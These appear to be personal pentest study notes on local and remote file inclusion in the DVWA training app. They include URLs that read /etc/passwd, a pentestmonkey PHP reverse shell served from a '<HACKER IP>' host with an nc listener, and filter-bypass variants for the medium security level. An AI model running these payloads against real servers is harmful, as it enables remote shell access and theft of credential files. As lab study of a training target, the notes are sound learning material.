what is file inclusion?

    File inclusion is a technique used in web development where external files or resources are included in a web page. Files like css, scripts, images...


    let's say a web application allows users to view a specific file on the server by providing the filename as a parameter in the URL. 
    If the application does not properly validate the input provided by the user, an attacker could inject a malicious file path as the parameter and execute their own code on the server.



Local file inclusion -> including local file (from the server itself)

    some intresting unix files are 
        /etc/passwd contains usernames
        /etc/shadow contains hashed passwords (when ran with root privilages)
        /etc/init.d contains most of the startup scripts on most linux distributions

    so lets try: http://<ip>/dvwa/vulnerabilities/fi/?page=/etc/passwd -> works with low and medium security


Remote file inclusion -> including a file from remote server

    http://<ip>/dvwa/vulnerabilities/fi/?page=https://www.google.com 


    lets get a reverse shell: 
        got reverse shell php file from: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

        python3 -m http.server 8000
        nc -nvlp 5555
        http://<VICTIM IP>/vulnerabilities/fi/?page=http://<HACKER IP>:8000/shell.php -> does the trick


    for medium security level:
        http://<VICTIM IP>/vulnerabilities/fi/?page=Http://<HACKER IP>:8000/shell.php
        http://<VICTIM IP>/vulnerabilities/fi/?page=hthttp://tp://<HACKER IP>:8000/shell.php



for high security:
    
    I have no idea
